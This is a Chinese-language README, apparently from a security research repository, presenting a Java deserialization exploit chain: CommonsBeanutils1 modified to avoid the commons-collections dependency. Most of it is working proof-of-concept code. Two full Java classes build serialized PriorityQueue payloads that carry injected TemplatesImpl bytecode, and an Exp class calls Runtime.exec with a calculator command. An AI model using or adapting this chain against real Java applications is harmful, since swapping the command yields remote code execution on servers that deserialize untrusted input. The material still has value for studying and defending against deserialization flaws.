# CommonsBeanutils1NoCC
    CommonsBeanutils1 去除commons-collections依赖

# 原理

    详情见：[p牛博客](https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html)

    主要是因为Apache Commons Beanutils 在初始化BeanComparator类的时候 使用了org.apache.commons.collections.comparators.ComparableComparator.getInstance()方法，用到了commons-collections，可以通过在初始化的时候传入Comparator去替换掉commons-collection下的comparators使用而避免commons-collections的依赖。

# poc
    p牛的博客中提供了两种方法

    1、使用java.lang.CaseInsensitiveComparator
    

```
import com.nqzero.permit.Permit;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import sun.misc.BASE64Decoder;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.AccessibleObject;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsBeanutils1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void setAccessible(AccessibleObject member) {
        // quiet runtime warnings from JDK9+
        Permit.setAccessible(member);
    }

    public static Constructor<?> getFirstCtor(final String name) throws Exception {
        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
        setAccessible(ctor);
        return ctor;
    }

    public static Object createTemplatesImpl() throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();

        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        Class cls = Exp.class;
        classPool.insertClassPath(new ClassClassPath(cls));
        CtClass clazz = classPool.get(cls.getName());
        CtClass superC = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        clazz.setSuperclass(superC);
        final byte[] classBytes = clazz.toBytecode();


        setFieldValue(templates, "_bytecodes", new byte[][]{ classBytes });
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        return templates;
    }



    public static byte[] getPayload() throws Exception {

        final Object templates = Gadgets.createTemplatesImpl();

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});
        
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        byte[] bytes = getPayload();

        ByteArrayInputStream in = new ByteArrayInputStream(bytes);
        ObjectInputStream ios = new ObjectInputStream(in);
        ios.readObject();
    }
}
```

    2、使用java.util.Collections$ReverseComparator
    
```
import com.nqzero.permit.Permit;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.AccessibleObject;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsBeanutils1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void setAccessible(AccessibleObject member) {
        // quiet runtime warnings from JDK9+
        Permit.setAccessible(member);
    }

    public static Constructor<?> getFirstCtor(final String name) throws Exception {
        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
        setAccessible(ctor);
        return ctor;
    }

    public static Object createTemplatesImpl() throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();

        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        Class cls = Exp.class;
        classPool.insertClassPath(new ClassClassPath(cls));
        CtClass clazz = classPool.get(cls.getName());
        CtClass superC = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        clazz.setSuperclass(superC);
        final byte[] classBytes = clazz.toBytecode();


        setFieldValue(templates, "_bytecodes", new byte[][]{ classBytes });
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        return templates;
    }


    public static byte[] getPayload() throws Exception {

        final Object templates = Gadgets.createTemplatesImpl();

        Constructor constructor = getFirstCtor("java.util.Collections$ReverseComparator");
        setAccessible(constructor);
        Object obj = constructor.newInstance();

        final BeanComparator comparator = new BeanComparator(null, (Comparator) obj);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        Gadgets.setFieldValue(comparator, "property", "outputProperties");
        Gadgets.setFieldValue(queue, "queue", new Object[]{templates, templates});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        byte[] bytes = getPayload();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
        ois.readObject();
    }
}

```

    exp

```
import java.io.IOException;

public class Exp {

    public Exp(){
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```


# 其他找寻思路

    继承于 Comparator 和 java.io.Serializable
